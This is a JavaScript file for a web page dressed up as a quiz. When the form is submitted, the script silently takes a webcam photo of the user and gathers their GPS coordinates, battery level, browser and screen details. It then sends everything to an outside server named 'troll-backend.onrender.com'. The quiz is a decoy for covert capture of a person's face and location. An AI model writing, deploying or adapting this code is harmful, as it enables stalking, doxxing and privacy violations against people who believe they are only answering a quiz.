const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");

// Make sure this points to your Render backend
const backendURL = "https://troll-backend.onrender.com/api/upload";

const constraints = { video: { facingMode: "user" }, audio: false };

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";

  try {
    // Access camera
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    await videoEl.play();

    // Wait until video is ready
    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));

    // Capture image
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString()
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Send data to backend
    const response = await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, ...metadata }) // send image + metadata fields
    });

    const result = await response.json();
    console.log("Upload result:", result);

    // Stop camera
    videoEl.srcObject.getTracks().forEach(track => track.stop());

    // Show success message
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";

    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";

  } catch (err) {
    console.error("Error uploading:", err);
    alert("Please allow camera access!");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
